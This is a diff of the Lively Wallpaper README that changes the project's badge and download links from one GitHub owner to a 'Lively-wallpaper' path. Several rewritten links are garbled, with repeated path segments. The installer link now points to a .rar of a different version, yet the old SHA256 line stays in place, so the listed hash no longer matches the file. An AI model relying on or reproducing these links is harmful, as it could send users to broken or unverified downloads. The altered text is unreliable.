@@ -1,10 +1,10 @@
 
 # Lively Wallpaper
-[![GitHub release](https://img.shields.io/github/release/rocksdanister/lively/all.svg)](https://github.com/rocksdanister/lively/releases)
-[![Github all releases](https://img.shields.io/github/downloads/rocksdanister/lively/total.svg)](https://github.com/rocksdanister/lively/releases)
-[![GitHub stars](https://img.shields.io/github/stars/rocksdanister/lively.svg)](https://github.com/rocksdanister/lively/stargazers)
-[![Documentation](https://img.shields.io/badge/Docs-WIP-red.svg)](https://github.com/rocksdanister/lively/wiki)
-[![Issues](https://img.shields.io/github/issues/rocksdanister/lively.svg)](https://github.com/rocksdanister/lively/issues)
+[![GitHub release](https://img.shields.io/github/release/rocksdanister/lively/all.svg)](https://github.com/Lively-wallpaper/lively/releases)
+[![Github all releases](https://img.shields.io/github/downloads/rocksdanister/lively/total.svg)](https://github.com/Lively-wallpaper/lively/releases)
+[![GitHub stars](https://img.shields.io/github/stars/rocksdanister/lively.svg)](https://github.com/Lively-wallpaper/lively/Lively-wallpaper/lively/Lively-wallpaper/lively/stargazers)
+[![Documentation](https://img.shields.io/badge/Docs-WIP-red.svg)](https://github.com/Lively-wallpaper/lively/Lively-wallpaper/lively/wiki)
+[![Issues](https://img.shields.io/github/issues/rocksdanister/lively.svg)](https://github.com/Lively-wallpaper/lively/issues)
 
 ## Contents
 - [About](#about)
@@ -116,7 +116,7 @@ Its super easy.. barely an inconvenience, just drag & drop the files or webpages
 
 SHA256: 8bf189dc5a0cdab5db905cbff4907d796d416f50df82eaedbc7e2c20e1a38cc2
      
-[direct-full-win32]: https://github.com/rocksdanister/lively/releases/download/v1.7.2.6/lively_setup_x86_full_v1726.exe
+[direct-full-win32]: https://github.com/Lively-wallpaper/lively/releases/download/v2.0.6.6/lively_setup_x86_full_v2066.rar
 
 Installer will give Smartscreen warning, [discussion.](https://github.com/rocksdanister/lively/issues/9)
 
